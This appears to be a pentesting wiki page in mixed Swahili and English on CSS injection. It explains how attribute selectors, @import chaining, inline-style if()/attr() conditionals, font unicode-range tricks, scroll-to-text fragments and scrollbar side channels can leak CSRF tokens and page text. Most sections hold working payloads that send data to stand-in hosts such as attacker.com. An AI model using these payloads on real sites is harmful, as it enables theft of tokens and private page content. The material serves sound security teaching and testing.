# CSS Injection

{{#include ../../../banners/hacktricks-training.md}}

## CSS Injection

### Attribute Selector

CSS selectors zimeundwa ili zifananishe thamani za sifa `name` na `value` za kipengee cha `input`. Ikiwa sifa ya `value` ya elementi ya `input` inaanza na alama maalum, rasilimali ya nje iliyotanguliwa itapakiwa:
```css
input[name="csrf"][value^="a"] {
background-image: url(https://attacker.com/exfil/a);
}
input[name="csrf"][value^="b"] {
background-image: url(https://attacker.com/exfil/b);
}
/* ... */
input[name="csrf"][value^="9"] {
background-image: url(https://attacker.com/exfil/9);
}
```
Hata hivyo, mbinu hii inakutana na kizuizi linapohusika na elementi za input zilizofichwa (`type="hidden"`) kwa sababu elementi zilizofichwa hazipaki backgrounds.

#### Bypass kwa Elementi Zilizofichwa

Ili kuepuka kizuizi hiki, unaweza kulenga elementi ya sibling inayofuata kwa kutumia `~` general sibling combinator. Kisha sheria ya CSS itumike kwa siblings wote wanaofuata elementi ya input iliyofichwa, na kusababisha picha ya background kupakia:
```css
input[name="csrf"][value^="csrF"] ~ * {
background-image: url(https://attacker.com/exfil/csrF);
}
```
Mfano wa vitendo wa kutumia mbinu hii umefafanuliwa kwa undani katika kipande cha msimbo kilichotolewa. Unaweza kuiona [here](https://gist.github.com/d0nutptr/928301bde1d2aa761d1632628ee8f24e).

#### Mahitaji ya CSS Injection

Ili mbinu ya CSS Injection iwe na ufanisi, masharti fulani yanapaswa kutimizwa:

1. **Payload Length**: vektori ya CSS injection inapaswa kuunga mkono payloads za urefu wa kutosha ili kuweza kubeba selectors zilizotengenezwa.
2. **CSS Re-evaluation**: Unapaswa kuwa na uwezo wa kuweka ukurasa ndani ya iframe, jambo muhimu ili kusababisha CSS itathminwe upya kwa payloads mpya zilizotengenezwa.
3. **External Resources**: Mbinu hii inategemea uwezo wa kutumia picha zilizohostwa kwa nje. Hii inaweza kuzuiliwa na Content Security Policy (CSP) ya tovuti.

### Blind Attribute Selector

As [**explained in this post**](https://portswigger.net/research/blind-css-exfiltration), it's possible to combine the selectors **`:has`** and **`:not`** to identify content even from blind elements. Hii ni muhimu sana unapokuwa huna wazo lolote kuhusu kile kilicho ndani ya ukurasa wa wavuti unaopakia CSS injection.\
Pia inawezekana kutumia selectors hizo kuchukua taarifa kutoka kwa vibloki kadhaa vya aina ile ile kama ilivyo katika:
```html
<style>
html:has(input[name^="m"]):not(input[name="mytoken"]) {
background: url(/m);
}
</style>
<input name="mytoken" value="1337" />
<input name="myname" value="gareth" />
```
Kuunganisha hii na mbinu ifuatayo ya **@import**, inawezekana ku-exfiltrate kiasi kikubwa cha **info using CSS injection from blind pages with** [**blind-css-exfiltration**](https://github.com/hackvertor/blind-css-exfiltration)**.

### @import

Mbinu ya awali ina mapungufu kadhaa, angalia prerequisites. Unahitaji kuwa na uwezo wa **send multiple links to the victim**, au unahitaji kuwa na uwezo wa **iframe the CSS injection vulnerable page**.

Walakini, kuna mbinu nyingine mahiri inayotumia **CSS `@import`** kuboresha ubora wa mbinu hiyo.

Hii ilionyeshwa kwa mara ya kwanza na [**Pepe Vila**](https://vwzq.net/slides/2019-s3_css_injection_attacks.pdf) na inafanya kazi kama ifuatavyo:

Badala ya kupakia ukurasa uleule mara kwa mara na makumi ya payloads tofauti kila wakati (kama ilivyokuwa hapo awali), tutapakia **load the page just once and just with an import to the attackers server** (hii ni payload ya kumtumia victim):
```css
@import url("//attacker.com:5001/start?");
```
1. The import is going to **pokea script ya CSS** kutoka kwa attackers na **kivinjari kitaipakia**.
2. The first part of the CSS script the attacker will send is **another `@import` to the attackers server again.**
1. The attackers server won't respond this request yet, as we want to leak some chars and then respond this import with the payload to leak the next ones.
3. The second and bigger part of the payload is going to be an **attribute selector leakage payload**
1. This will send to the attackers server the **first char of the secret and the last one**
4. Once the attackers server has received the **first and last char of the secret**, it will **respond the import requested in the step 2**.
1. The response is going to be exactly the same as the **steps 2, 3 and 4**, but this time it will try to **find the second char of the secret and then penultimate**.

Mshambuliaji ata f**uata mzunguko huo hadi itakapofaulu leak kabisa the secret**.

You can find the original [**Pepe Vila's code to exploit this here**](https://gist.github.com/cgvwzq/6260f0f0a47c009c87b4d46ce3808231) or you can find almost the [**same code but commented here**.](#css-injection)

> [!TIP]
> The script will try to discover 2 chars each time (from the beginning and from the end) because the attribute selector allows to do things like:
>
> ```css
> /* value^=  to match the beggining of the value*/
> input[value^="0"] {
>  --s0: url(http://localhost:5001/leak?pre=0);
> }
>
> /* value$=  to match the ending of the value*/
> input[value$="f"] {
>  --e0: url(http://localhost:5001/leak?post=f);
> }
> ```
>
> This allows the script to leak the secret faster.

> [!WARNING]
> Wakati mwingine script **haitambui kwa usahihi kwamba prefix + suffix zilizogunduliwa tayari ni flag kamili** na itaendelea mbele (katika prefix) na nyuma (katika suffix) na kwa wakati fulani itaishia kusimamika.\
> Usihofu, angalia tu **output** kwa sababu **unaweza kuona flag pale**.

### Inline-Style CSS Exfiltration (attr() + if() + image-set())

Primitive hii inaruhusu exfiltration kwa kutumia tu attribute ya inline style ya element, bila selectors au external stylesheets. Inategemea CSS custom properties, func attr() kusoma attributes za element ile ile, conditionals mpya za CSS if() kwa branching, na image-set() ili kuanzisha request ya mtandao ambayo inaencode value iliyolingana.

> [!WARNING]
> Equality comparisons in if() require double quotes for string literals. Single quotes will not match.

- Sink: dhibiti attribute ya style ya element na uhakikishe attribute lengwa iko kwenye element ile ile (attr() husoma tu attributes za element ile ile).
- Read: nakili attribute kwenye variable ya CSS: `--val: attr(title)`.
- Decide: chagua URL kwa kutumia nested conditionals zinazolinganishwa variable na string candidates: `--steal: if(style(--val:"1"): url(//attacker/1); else: url(//attacker/2))`.
- Exfiltrate: tumia `background: image-set(var(--steal))` (au property yoyote inayofanya fetch) ili kulazimisha request kwa endpoint iliyochaguliwa.

Attempt (does not work; single quotes in comparison):
```html
<div style="--val:attr(title);--steal:if(style(--val:'1'): url(/1); else: url(/2));background:image-set(var(--steal))" title=1>test</div>
```
payload inayofanya kazi (nukuu mbili zinahitajika katika ulinganisho):
```html
<div style='--val:attr(title);--steal:if(style(--val:"1"): url(/1); else: url(/2));background:image-set(var(--steal))' title=1>test</div>
```
Kuorodhesha thamani za sifa kwa masharti yaliyowekwa ndani:
```html
<div style='--val: attr(data-uid); --steal: if(style(--val:"1"): url(/1); else: if(style(--val:"2"): url(/2); else: if(style(--val:"3"): url(/3); else: if(style(--val:"4"): url(/4); else: if(style(--val:"5"): url(/5); else: if(style(--val:"6"): url(/6); else: if(style(--val:"7"): url(/7); else: if(style(--val:"8"): url(/8); else: if(style(--val:"9"): url(/9); else: url(/10)))))))))); background: image-set(var(--steal));' data-uid='1'></div>
```
Demo ya kweli (kujaribu majina ya watumiaji):
```html
<div style='--val: attr(data-username); --steal: if(style(--val:"martin"): url(https://attacker.tld/martin); else: if(style(--val:"zak"): url(https://attacker.tld/zak); else: url(https://attacker.tld/james))); background: image-set(var(--steal));' data-username="james"></div>
```
Vidokezo na vikwazo:

- Inafanya kazi kwenye vivinjari vya Chromium-based wakati wa utafiti; tabia inaweza kutofautiana kwenye injini nyingine za kivinjari.
- Inafaa zaidi kwa value spaces zenye ukomo/zinazohesabika (IDs, flags, short usernames). Kuba strings ndefu bila external stylesheets bado ni changamoto.
- Kila CSS property inayopakia URL inaweza kutumika kuanzisha ombi (mfano, background/image-set, border-image, list-style, cursor, content).

Automation: a Burp Custom Action can generate nested inline-style payloads to brute-force attribute values: https://github.com/PortSwigger/bambdas/blob/main/CustomAction/InlineStyleAttributeStealer.bambda

### Other selectors

Njia nyingine za kufikia sehemu za DOM kwa kutumia **CSS selectors**:

- **`.class-to-search:nth-child(2)`**: Hii itatafuta kipengee cha pili chenye class "class-to-search" kwenye DOM.
- **`:empty`** selector: Imetumika kwa mfano katika [**this writeup**](https://github.com/b14d35/CTF-Writeups/tree/master/bi0sCTF%202022/Emo-Locker)**:**

```css
[role^="img"][aria-label="1"]:empty {
background-image: url("YOUR_SERVER_URL?1");
}
```

### Error based XS-Search

**Reference:** [CSS based Attack: Abusing unicode-range of @font-face ](https://mksben.l0.cm/2015/10/css-based-attack-abusing-unicode-range.html), [Error-Based XS-Search PoC by @terjanq](https://twitter.com/terjanq/status/1180477124861407234)

Lengo kwa ujumla ni **kutumia custom font kutoka kwa endpoint inayodhibitiwa** na kuhakikisha kwamba **maandishi (katika kesi hii, 'A') yanaonyeshwa na font hii tu ikiwa rasilimali iliyotajwa (`favicon.ico`) haiwezi kupakuliwa**.
```html
<!DOCTYPE html>
<html>
<head>
<style>
@font-face {
font-family: poc;
src: url(http://attacker.com/?leak);
unicode-range: U+0041;
}

#poc0 {
font-family: "poc";
}
</style>
</head>
<body>
<object id="poc0" data="http://192.168.0.1/favicon.ico">A</object>
</body>
</html>
```
1. **Matumizi ya Fonti Maalum**:

- Fonti maalum imefafanuliwa kwa kutumia kanuni ya `@font-face` ndani ya `<style>` tagi katika sehemu ya `<head>`.
- Fonti inaitwa `poc` na inavutwa kutoka kwa external endpoint (`http://attacker.com/?leak`).
- Mali ya `unicode-range` imewekwa kwa `U+0041`, ikilenga herufi maalum ya Unicode 'A'.

2. **Elemento la <object> na Maandishi ya Fallback**:
- Kipengee cha `<object>` chenye `id="poc0"` kimeundwa katika sehemu ya `<body>`. Kipengee hiki kinajaribu kupakia rasilimali kutoka `http://192.168.0.1/favicon.ico`.
- `font-family` kwa kipengee hiki imewekwa kuwa `'poc'`, kama ilivyoainishwa katika sehemu ya `<style>`.
- Iwapo rasilimali (`favicon.ico`) itashindwa kupakiwa, yaliyomo ya fallback (herufi 'A') ndani ya `<object>` tagi yataonyeshwa.
- Yaliyomo ya fallback ('A') yataonyeshwa kwa kutumia fonti maalum `poc` ikiwa rasilimali ya nje haiwezi kupakiwa.

### Uwekaji mtindo wa Scroll-to-Text Fragment

Pseudo-class ya **`:target`** inatumiwa kuchagua kipengee kinacholengwa na **URL fragment**, kama ilivyoainishwa katika [CSS Selectors Level 4 specification](https://drafts.csswg.org/selectors-4/#the-target-pseudo). Ni muhimu kuelewa kwamba `::target-text` haiendani na vipengee vyovyote isipokuwa maandishi yamelengwa wazi na fragment.

Shida ya usalama inatokea wakati washambuliaji wanapotumia kipengele cha **Scroll-to-text** fragment, na kuwapa uwezo wa kuthibitisha uwepo wa maandishi maalum kwenye ukurasa wa wavuti kwa kupakia rasilimali kutoka kwenye server yao kupitia HTML injection. Mbinu hiyo inahusisha kuingiza kanuni ya CSS kama hii:
```css
:target::before {
content: url(target.png);
}
```
Katika hali kama hizi, ikiwa maandishi "Administrator" yapo kwenye ukurasa, rasilimali `target.png` itaombwa kutoka kwenye seva, ikionyesha kuwepo kwa maandishi hayo. Mfano wa shambulio hili unaweza kutekelezwa kupitia URL iliyotengenezwa kwa njia maalum inayojumuisha CSS iliyoinjizwa pamoja na Scroll-to-text fragment:
```
http://127.0.0.1:8081/poc1.php?note=%3Cstyle%3E:target::before%20{%20content%20:%20url(http://attackers-domain/?confirmed_existence_of_Administrator_username)%20}%3C/style%3E#:~:text=Administrator
```
Hapa, shambulio linatumia HTML injection kusafirisha CSS code, likilenga maandishi maalum "Administrator" kupitia Scroll-to-text fragment (`#:~:text=Administrator`). Ikiwa maandishi hayo yatapatikana, rasilimali iliyotajwa itapakiwa, kwa bahati mbaya ikimtangaza kuwepo kwake kwa attacker.

Kwa ajili ya kuzuia, mambo yafuatayo yanapaswa kuzingatiwa:

1. **Constrained STTF Matching**: Scroll-to-text Fragment (STTF) imetengenezwa ili kuendana tu na maneno au sentensi, hivyo kupunguza uwezo wake wa leak siri yoyote au tokens.
2. **Restriction to Top-level Browsing Contexts**: STTF inafanya kazi tu katika top-level browsing contexts na haifanyi kazi ndani ya iframes, na kufanya jaribio lolote la exploitation kuonekana zaidi kwa user.
3. **Necessity of User Activation**: STTF inahitaji user-activation gesture ili ifanye kazi, ikimaanisha exploitations zinawezekana tu kupitia user-initiated navigations. Hitaji hili linapunguza kwa kiasi kikubwa hatari ya attacks kufanywa kwa automated bila user interaction. Hata hivyo, mwandishi wa blogu anaonyesha masharti maalum na bypasses (mf., social engineering, interaction na prevalent browser extensions) ambazo zinaweza kurahisisha automation ya attack.

Kujua kuhusu mechanisms hizi na potential vulnerabilities ni muhimu kwa kudumisha web security na kujikinga dhidi ya exploitative tactics kama hizi.

Kwa taarifa zaidi angalia ripoti ya awali: [https://www.secforce.com/blog/new-technique-of-stealing-data-using-css-and-scroll-to-text-fragment-feature/](https://www.secforce.com/blog/new-technique-of-stealing-data-using-css-and-scroll-to-text-fragment-feature/)

You can check an [**exploit using this technique for a CTF here**](https://gist.github.com/haqpl/52455c8ddfec33aeefb468301d70b6eb).

### @font-face / unicode-range <a href="#text-node-exfiltration-i-ligatures" id="text-node-exfiltration-i-ligatures"></a>

Unaweza kubainisha **fonti za nje kwa thamani maalum za unicode** ambazo zitatokewa tu ikiwa thamani hizo za unicode zipo kwenye ukurasa. Kwa mfano:
```html
<style>
@font-face {
font-family: poc;
src: url(http://attacker.example.com/?A); /* fetched */
unicode-range: U+0041;
}
@font-face {
font-family: poc;
src: url(http://attacker.example.com/?B); /* fetched too */
unicode-range: U+0042;
}
@font-face {
font-family: poc;
src: url(http://attacker.example.com/?C); /* not fetched */
unicode-range: U+0043;
}
#sensitive-information {
font-family: poc;
}
</style>

<p id="sensitive-information">AB</p>
htm
```
When you access this page, Chrome and Firefox fetch "?A" and "?B" because text node of sensitive-information contains "A" and "B" characters. But Chrome and Firefox do not fetch "?C" because it does not contain "C". This means that we have been able to read "A" and "B".

### Text node exfiltration (I): ligatures <a href="#text-node-exfiltration-i-ligatures" id="text-node-exfiltration-i-ligatures"></a>

**Reference:** [Wykradanie danych w świetnym stylu – czyli jak wykorzystać CSS-y do ataków na webaplikację](https://sekurak.pl/wykradanie-danych-w-swietnym-stylu-czyli-jak-wykorzystac-css-y-do-atakow-na-webaplikacje/)

Mbinu iliyotajwa inahusisha kutoa maandishi kutoka kwa node kwa kutumia ligatures za font na kufuatilia mabadiliko ya upana. Mchakato unajumuisha hatua kadhaa:

1. **Creation of Custom Fonts**:

- Fonts za SVG zinaundwa zikiwa na glyphs zenye attribute `horiz-adv-x`, ambayo inasetua upana mkubwa kwa glyph inayowakilisha mfululizo wa wahusika wawili.
- Mfano wa SVG glyph: `<glyph unicode="XY" horiz-adv-x="8000" d="M1 0z"/>`, ambapo "XY" inaonyesha mfululizo wa wahusika wawili.
- Fonts hizi kisha zinageuzwa kuwa format ya woff kwa kutumia fontforge.

2. **Detection of Width Changes**:

- CSS inatumiwa kuhakikisha kuwa maandishi hayajazungushwa (`white-space: nowrap`) na kubinafsisha muonekano wa scrollbar.
- Kuibuka kwa horizontal scrollbar, iliyopambwa kwa njia maalum, hutumika kama kiashiria (oracle) kuwa ligature maalum, na kwa hivyo mfululizo maalum wa wahusika, zipo ndani ya maandishi.
- The CSS involved:
```css
body {
white-space: nowrap;
}
body::-webkit-scrollbar {
background: blue;
}
body::-webkit-scrollbar:horizontal {
background: url(http://attacker.com/?leak);
}
```

3. **Exploit Process**:

- **Hatua 1**: Fonts zinaundwa kwa jozi za herufi zenye upana mkubwa.
- **Hatua 2**: Njia ya scrollbar inatumika kugundua wakati glyph yenye upana mkubwa (ligature ya mfululizo wa herufi mbili) inachorwa, ikionyesha uwepo wa mfululizo huo wa herufi.
- **Hatua 3**: Ukigundua ligature, glyph mpya zinazoonyesha mfululizo wa herufi tatu zinatengenezwa, zikijumuisha jozi iliyotambuliwa na kuongeza herufi kabla au baada yake.
- **Hatua 4**: Ugundaji wa ligature ya herufi tatu unafanywa.
- **Hatua 5**: Mchakato unarudishwa, ukifungua hatua kwa hatua maandishi yote.

4. **Optimization**:
- Njia ya kuanzisha iliyopo kwa sasa ikitumia `<meta refresh=...` si bora.
- Njia bora inaweza kuwa kutumia trick ya CSS `@import`, kuboresha utendaji wa exploit.

### Text node exfiltration (II): leaking the charset with a default font (not requiring external assets) <a href="#text-node-exfiltration-ii-leaking-the-charset-with-a-default-font" id="text-node-exfiltration-ii-leaking-the-charset-with-a-default-font"></a>

**Reference:** [PoC using Comic Sans by @Cgvwzq & @Terjanq](https://demo.vwzq.net/css2.html)

Trick hii ilitolewa katika hilo la [**Slackers thread**](https://www.reddit.com/r/Slackers/comments/dzrx2s/what_can_we_do_with_single_css_injection/). Charset inayotumika katika text node inaweza leak kwa kutumia font za default zilizowekwa kwenye browser: hakuna fonts za nje au maalum zinazohitajika.

Wazo linategemea kutumia animation kupanua upana wa `div` kwa hatua, ikiruhusu herufi moja kwa wakati kuhamia kutoka sehemu ya 'suffix' ya maandishi hadi sehemu ya 'prefix'. Mchakato huu unagawanya maandishi katika sehemu mbili:

1. **Prefix**: Mstari wa kwanza.
2. **Suffix**: Mstari/mistari inayofuata.

Hatua za mabadiliko ya wahusika zitaonekana kama ifuatavyo:

**C**\
ADB

**CA**\
DB

**CAD**\
B

**CADB**

Wakati wa mchakato huu, trick ya `unicode-range` inatumiwa kutambua kila herufi mpya inapojumuishwa kwenye prefix. Hii inafikiwa kwa kubadili font kuwa Comic Sans, ambayo ni wazi kuwa ndefu zaidi kuliko font ya default, na hivyo kusababisha scrollbar ya wima. Kuonekana kwa scrollbar hii kwa njia isiyo ya moja kwa moja kunaonyesha uwepo wa herufi mpya katika prefix.

Ingawa njia hii inaruhusu kugundua herufi za kipekee zinapoonekana, haisemi ni herufi gani imekurudishwa, bali tu kwamba kurudishwa kumejitokeza.

> [!TIP]
> Kwa msingi, `unicode-range` inatumika kugundua herufi, lakini kwa kuwa hatutaki kupakia font ya nje, tunahitaji njia nyingine.\
> Wakati herufi inapotambuliwa, inatolewa na kupatiwa font ya kabla imewekwa Comic Sans, ambayo inafanya herufi kuwa kubwa zaidi na kusababisha scrollbar ambayo italeak herufi iliyopatikana.

Check the code extracted from the PoC:
```css
/* comic sans is high (lol) and causes a vertical overflow */
@font-face {
font-family: has_A;
src: local("Comic Sans MS");
unicode-range: U+41;
font-style: monospace;
}
@font-face {
font-family: has_B;
src: local("Comic Sans MS");
unicode-range: U+42;
font-style: monospace;
}
@font-face {
font-family: has_C;
src: local("Comic Sans MS");
unicode-range: U+43;
font-style: monospace;
}
@font-face {
font-family: has_D;
src: local("Comic Sans MS");
unicode-range: U+44;
font-style: monospace;
}
@font-face {
font-family: has_E;
src: local("Comic Sans MS");
unicode-range: U+45;
font-style: monospace;
}
@font-face {
font-family: has_F;
src: local("Comic Sans MS");
unicode-range: U+46;
font-style: monospace;
}
@font-face {
font-family: has_G;
src: local("Comic Sans MS");
unicode-range: U+47;
font-style: monospace;
}
@font-face {
font-family: has_H;
src: local("Comic Sans MS");
unicode-range: U+48;
font-style: monospace;
}
@font-face {
font-family: has_I;
src: local("Comic Sans MS");
unicode-range: U+49;
font-style: monospace;
}
@font-face {
font-family: has_J;
src: local("Comic Sans MS");
unicode-range: U+4a;
font-style: monospace;
}
@font-face {
font-family: has_K;
src: local("Comic Sans MS");
unicode-range: U+4b;
font-style: monospace;
}
@font-face {
font-family: has_L;
src: local("Comic Sans MS");
unicode-range: U+4c;
font-style: monospace;
}
@font-face {
font-family: has_M;
src: local("Comic Sans MS");
unicode-range: U+4d;
font-style: monospace;
}
@font-face {
font-family: has_N;
src: local("Comic Sans MS");
unicode-range: U+4e;
font-style: monospace;
}
@font-face {
font-family: has_O;
src: local("Comic Sans MS");
unicode-range: U+4f;
font-style: monospace;
}
@font-face {
font-family: has_P;
src: local("Comic Sans MS");
unicode-range: U+50;
font-style: monospace;
}
@font-face {
font-family: has_Q;
src: local("Comic Sans MS");
unicode-range: U+51;
font-style: monospace;
}
@font-face {
font-family: has_R;
src: local("Comic Sans MS");
unicode-range: U+52;
font-style: monospace;
}
@font-face {
font-family: has_S;
src: local("Comic Sans MS");
unicode-range: U+53;
font-style: monospace;
}
@font-face {
font-family: has_T;
src: local("Comic Sans MS");
unicode-range: U+54;
font-style: monospace;
}
@font-face {
font-family: has_U;
src: local("Comic Sans MS");
unicode-range: U+55;
font-style: monospace;
}
@font-face {
font-family: has_V;
src: local("Comic Sans MS");
unicode-range: U+56;
font-style: monospace;
}
@font-face {
font-family: has_W;
src: local("Comic Sans MS");
unicode-range: U+57;
font-style: monospace;
}
@font-face {
font-family: has_X;
src: local("Comic Sans MS");
unicode-range: U+58;
font-style: monospace;
}
@font-face {
font-family: has_Y;
src: local("Comic Sans MS");
unicode-range: U+59;
font-style: monospace;
}
@font-face {
font-family: has_Z;
src: local("Comic Sans MS");
unicode-range: U+5a;
font-style: monospace;
}
@font-face {
font-family: has_0;
src: local("Comic Sans MS");
unicode-range: U+30;
font-style: monospace;
}
@font-face {
font-family: has_1;
src: local("Comic Sans MS");
unicode-range: U+31;
font-style: monospace;
}
@font-face {
font-family: has_2;
src: local("Comic Sans MS");
unicode-range: U+32;
font-style: monospace;
}
@font-face {
font-family: has_3;
src: local("Comic Sans MS");
unicode-range: U+33;
font-style: monospace;
}
@font-face {
font-family: has_4;
src: local("Comic Sans MS");
unicode-range: U+34;
font-style: monospace;
}
@font-face {
font-family: has_5;
src: local("Comic Sans MS");
unicode-range: U+35;
font-style: monospace;
}
@font-face {
font-family: has_6;
src: local("Comic Sans MS");
unicode-range: U+36;
font-style: monospace;
}
@font-face {
font-family: has_7;
src: local("Comic Sans MS");
unicode-range: U+37;
font-style: monospace;
}
@font-face {
font-family: has_8;
src: local("Comic Sans MS");
unicode-range: U+38;
font-style: monospace;
}
@font-face {
font-family: has_9;
src: local("Comic Sans MS");
unicode-range: U+39;
font-style: monospace;
}
@font-face {
font-family: rest;
src: local("Courier New");
font-style: monospace;
unicode-range: U+0-10FFFF;
}

div.leak {
overflow-y: auto; /* leak channel */
overflow-x: hidden; /* remove false positives */
height: 40px; /* comic sans capitals exceed this height */
font-size: 0px; /* make suffix invisible */
letter-spacing: 0px; /* separation */
word-break: break-all; /* small width split words in lines */
font-family: rest; /* default */
background: grey; /* default */
width: 0px; /* initial value */
animation: loop step-end 200s 0s, trychar step-end 2s 0s; /* animations: trychar duration must be 1/100th of loop duration */
animation-iteration-count: 1, infinite; /* single width iteration, repeat trychar one per width increase (or infinite) */
}

div.leak::first-line {
font-size: 30px; /* prefix is visible in first line */
text-transform: uppercase; /* only capital letters leak */
}

/* iterate over all chars */
@keyframes trychar {
0% {
font-family: rest;
} /* delay for width change */
5% {
font-family: has_A, rest;
--leak: url(?a);
}
6% {
font-family: rest;
}
10% {
font-family: has_B, rest;
--leak: url(?b);
}
11% {
font-family: rest;
}
15% {
font-family: has_C, rest;
--leak: url(?c);
}
16% {
font-family: rest;
}
20% {
font-family: has_D, rest;
--leak: url(?d);
}
21% {
font-family: rest;
}
25% {
font-family: has_E, rest;
--leak: url(?e);
}
26% {
font-family: rest;
}
30% {
font-family: has_F, rest;
--leak: url(?f);
}
31% {
font-family: rest;
}
35% {
font-family: has_G, rest;
--leak: url(?g);
}
36% {
font-family: rest;
}
40% {
font-family: has_H, rest;
--leak: url(?h);
}
41% {
font-family: rest;
}
45% {
font-family: has_I, rest;
--leak: url(?i);
}
46% {
font-family: rest;
}
50% {
font-family: has_J, rest;
--leak: url(?j);
}
51% {
font-family: rest;
}
55% {
font-family: has_K, rest;
--leak: url(?k);
}
56% {
font-family: rest;
}
60% {
font-family: has_L, rest;
--leak: url(?l);
}
61% {
font-family: rest;
}
65% {
font-family: has_M, rest;
--leak: url(?m);
}
66% {
font-family: rest;
}
70% {
font-family: has_N, rest;
--leak: url(?n);
}
71% {
font-family: rest;
}
75% {
font-family: has_O, rest;
--leak: url(?o);
}
76% {
font-family: rest;
}
80% {
font-family: has_P, rest;
--leak: url(?p);
}
81% {
font-family: rest;
}
85% {
font-family: has_Q, rest;
--leak: url(?q);
}
86% {
font-family: rest;
}
90% {
font-family: has_R, rest;
--leak: url(?r);
}
91% {
font-family: rest;
}
95% {
font-family: has_S, rest;
--leak: url(?s);
}
96% {
font-family: rest;
}
}

/* increase width char by char, i.e. add new char to prefix */
@keyframes loop {
0% {
width: 0px;
}
1% {
width: 20px;
}
2% {
width: 40px;
}
3% {
width: 60px;
}
4% {
width: 80px;
}
4% {
width: 100px;
}
5% {
width: 120px;
}
6% {
width: 140px;
}
7% {
width: 0px;
}
}

div::-webkit-scrollbar {
background: blue;
}

/* side-channel */
div::-webkit-scrollbar:vertical {
background: blue var(--leak);
}
```
### Text node exfiltration (III): leaking the charset with a default font by hiding elements (not requiring external assets) <a href="#text-node-exfiltration-ii-leaking-the-charset-with-a-default-font" id="text-node-exfiltration-ii-leaking-the-charset-with-a-default-font"></a>

**Marejeo:** Hii imetajwa kama [an unsuccessful solution in this writeup](https://blog.huli.tw/2022/06/14/en/justctf-2022-writeup/#ninja1-solves)

Kesi hii ni sawa sana na ile ya awali, hata hivyo, katika kesi hii lengo la kufanya **chars maalum kuwa kubwa kuliko mengine ni kukificha kitu** kama kitufe ili kisibonyezwe na bot au picha ambayo haitapakiwa. Kwa hivyo tunaweza kupima kitendo (au kukosekana kwa kitendo) na kujua ikiwa char maalum ipo ndani ya maandishi.

### Text node exfiltration (III): leaking the charset by cache timing (not requiring external assets) <a href="#text-node-exfiltration-ii-leaking-the-charset-with-a-default-font" id="text-node-exfiltration-ii-leaking-the-charset-with-a-default-font"></a>

**Marejeo:** Hii imetajwa kama [an unsuccessful solution in this writeup](https://blog.huli.tw/2022/06/14/en/justctf-2022-writeup/#ninja1-solves)

Katika kesi hii, tunaweza kujaribu leak ikiwa char iko ndani ya maandishi kwa kupakia a fake font kutoka the same origin:
```css
@font-face {
font-family: "A1";
src: url(/static/bootstrap.min.css?q=1);
unicode-range: U+0041;
}
```
Ikiwa kuna mechi, **font itapakiwa kutoka `/static/bootstrap.min.css?q=1`**. Ingawa haitapakia kwa mafanikio, **kivinjari kinapaswa kuihifadhi kwenye cache**, na hata kama hakuna cache, kuna mekanismu ya **304 not modified**, hivyo **majibu yanapaswa kuwa ya haraka** kuliko vitu vingine.

Walakini, ikiwa tofauti ya muda kati ya majibu yaliyo kwenye cache na yasiyo kwenye cache si kubwa kutosha, hii haitakuwa ya msaada. Kwa mfano, mwandishi alitaja: However, after testing, I found that the first problem is that the speed is not much different, and the second problem is that the bot uses the `disk-cache-size=1` flag, which is really thoughtful.

### Text node exfiltration (III): leaking the charset by timing loading hundreds of local "fonts" (not requiring external assets) <a href="#text-node-exfiltration-ii-leaking-the-charset-with-a-default-font" id="text-node-exfiltration-ii-leaking-the-charset-with-a-default-font"></a>

**Marejeo:** This is mentioned as [an unsuccessful solution in this writeup](https://blog.huli.tw/2022/06/14/en/justctf-2022-writeup/#ninja1-solves)

Katika kesi hii unaweza kuonyesha **CSS ili kupakia mamia ya fake fonts** kutoka same origin wakati mechi inapotokea. Kwa njia hii unaweza **kupima muda** unaochukua na kugundua kama char inaonekana au la kwa kitu kama:
```css
@font-face {
font-family: "A1";
src: url(/static/bootstrap.min.css?q=1), url(/static/bootstrap.min.css?q=2),
.... url(/static/bootstrap.min.css?q=500);
unicode-range: U+0041;
}
```
Na code ya bot inaonekana hivi:
```python
browser.get(url)
WebDriverWait(browser, 30).until(lambda r: r.execute_script('return document.readyState') == 'complete')
time.sleep(30)
```
Kwa hivyo, ikiwa font haifanani, muda wa majibu wakati wa kutembelea bot unatarajiwa kuwa takriban sekunde 30. Hata hivyo, ikiwa kuna mechi ya font, maombi mengi yatapelekwa ili kupata font, na kusababisha mtandao kuwa na shughuli endelevu. Matokeo yake, itachukua muda mrefu kufikia masharti ya kusitisha na kupokea jibu. Kwa hivyo, muda wa majibu unaweza kutumika kama kiashiria cha kubaini kama kuna mechi ya font.

## Marejeo

- [https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e](https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e)
- [https://d0nut.medium.com/better-exfiltration-via-html-injection-31c72a2dae8b](https://d0nut.medium.com/better-exfiltration-via-html-injection-31c72a2dae8b)
- [https://infosecwriteups.com/exfiltration-via-css-injection-4e999f63097d](https://infosecwriteups.com/exfiltration-via-css-injection-4e999f63097d)
- [https://x-c3ll.github.io/posts/CSS-Injection-Primitives/](https://x-c3ll.github.io/posts/CSS-Injection-Primitives/)
- [Inline Style Exfiltration: leaking data with chained CSS conditionals (PortSwigger)](https://portswigger.net/research/inline-style-exfiltration)
- [InlineStyleAttributeStealer.bambda (Burp Custom Action)](https://github.com/PortSwigger/bambdas/blob/main/CustomAction/InlineStyleAttributeStealer.bambda)
- [PoC page for inline-style exfiltration](https://portswigger-labs.net/inline-style-exfiltration-ff1072wu/test.php)
- [MDN: CSS if() conditional](https://developer.mozilla.org/en-US/docs/Web/CSS/if)
- [MDN: CSS attr() function](https://developer.mozilla.org/en-US/docs/Web/CSS/attr)
- [MDN: image-set()](https://developer.mozilla.org/en-US/docs/Web/CSS/image/image-set)

{{#include ../../../banners/hacktricks-training.md}}
